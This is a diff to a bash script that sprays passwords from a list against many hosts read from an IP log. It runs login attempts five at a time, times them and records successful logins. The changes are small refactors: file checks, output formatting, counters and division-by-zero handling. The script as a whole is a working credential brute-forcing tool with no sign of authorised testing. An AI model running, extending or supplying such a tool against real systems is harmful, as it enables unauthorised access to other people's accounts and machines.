@@ -6,13 +6,7 @@ passwords_file="passwords.txt"
 success_log_file="successful_logins.txt"
 temp_passwords_file="temp_passwords.txt"
 
-# Create missing files if they don't exist
-[[ ! -f "$iplog_file" ]] && touch "$iplog_file"
-[[ ! -f "$passwords_file" ]] && touch "$passwords_file"
-[[ ! -f "$success_log_file" ]] && touch "$success_log_file"
-[[ ! -f "$temp_passwords_file" ]] && touch "$temp_passwords_file"
-
-# Function to clean up before exiting (does not modify passwords.txt)
+# Function to clean up and save passwords before exiting
 cleanup() {
     echo "Saving current state of passwords..."
     mv "$temp_passwords_file" "$passwords_file"
@@ -24,7 +18,7 @@ trap cleanup SIGINT SIGTERM
 
 # Check if the input files exist
 if [[ ! -f "$iplog_file" || ! -f "$passwords_file" ]]; then
-    echo -e "\e[31mOne or both files do not exist, exiting.\e[0m"
+    echo "Error: One or both files do not exist, exiting."
     exit 1
 fi
 
@@ -66,7 +60,7 @@ for index in "${!passwords[@]}"; do
     password="${passwords[index]}"
     current_line=$((index + 1))
 
-    echo -e "$(date '+%Y-%m-%d %H:%M:%S') - Currently checking password: $password (Line $current_line of $total_passwords)"
+    echo "$(date '+%Y-%m-%d %H:%M:%S') - Currently checking password: $password (Line $current_line of $total_passwords)"
 
     # Start timer for this password
     password_start_time=$(date +%s)
@@ -75,13 +69,12 @@ for index in "${!passwords[@]}"; do
     for entry in "${iplog_entries[@]}"; do
         # Attempt login
         attempt_login "$entry" "$password" &
+        ((attempts++))
 
         # Limit to 5 concurrent jobs to reduce load
         while (( $(jobs -r -p | wc -l) >= 5 )); do
             wait -n  # Wait for at least one job to finish
         done
-
-        ((attempts++))
     done
 
     # Wait for all background jobs to finish for this password
@@ -92,41 +85,43 @@ for index in "${!passwords[@]}"; do
     password_duration=$(( password_end_time - password_start_time ))
 
     # Calculate speed of attempts (in seconds per attempt)
+    speed="N/A"  # Default speed
     if (( attempts > 0 )); then
         speed=$(bc -l <<< "scale=2; $password_duration / $attempts")  # Calculate speed as duration divided by attempts
-    else
-        speed="N/A"  # If no attempts, set speed to N/A
     fi
 
-    # Indicate that the password has been checked and remove it from the list
+    # Indicate that the password has been checked and save it for cleanup
     echo "$password was deleted from the list of passwords (Lines left: $((total_passwords - (index + 1))))"
-    echo -e "Time taken for password '$password': $password_duration seconds, Speed: $speed seconds/attempt."
+    echo "Time taken for password '$password': $password_duration seconds, Speed: $speed seconds/attempt."
 
     # Save the checked password for final cleanup
-    echo "$password" >> "$temp_passwords_file"  
+    echo "$password" >> "$temp_passwords_file"
 done
 
 # Wait for any remaining background jobs
 wait
 
-# Move the temp_passwords_file back to passwords_file only if it is different
-if ! cmp -s "$temp_passwords_file" "$passwords_file"; then
-    mv "$temp_passwords_file" "$passwords_file"
-else
-    rm "$temp_passwords_file"
-fi
+# Create a new passwords file without the checked passwords
+mv "$temp_passwords_file" "$passwords_file"
 
 # Calculate elapsed time and estimate remaining time
 end_time=$(date +%s)
 elapsed_time=$(( end_time - start_time ))
-avg_time_per_password=$(( elapsed_time / (successful_attempts > 0 ? successful_attempts : 1) ))
+
+if (( successful_attempts > 0 )); then
+    avg_time_per_password=$(( elapsed_time / successful_attempts ))
+else
+    avg_time_per_password=0  # Avoid division by zero
+fi
+
 remaining_passwords=$(wc -l < "$passwords_file")
 estimated_time=$(( remaining_passwords * avg_time_per_password ))
 
 # Final report
-echo -e "\n\e[36m----------------------------------------\e[0m"
-echo -e "\e[36mTotal Successful Logins: \e[32m$successful_attempts\e[0m"
-echo -e "\e[36mEstimated time remaining: \e[33m$(printf '%d:%02d:%02d' $((estimated_time/3600)) $(( (estimated_time%3600)/60 )) $((estimated_time%60)))\e[0m"
+echo
+echo "----------------------------------------"
+echo "Total Successful Logins: $successful_attempts"
+echo "Estimated time remaining: $(printf '%d:%02d:%02d' $((estimated_time/3600)) $(( (estimated_time%3600)/60 )) $((estimated_time%60)))"
 
 # Log the total count of successful logins
 echo "$(date '+%Y-%m-%d %H:%M:%S') - Total Successful Logins: $successful_attempts" >> "$success_log_file"
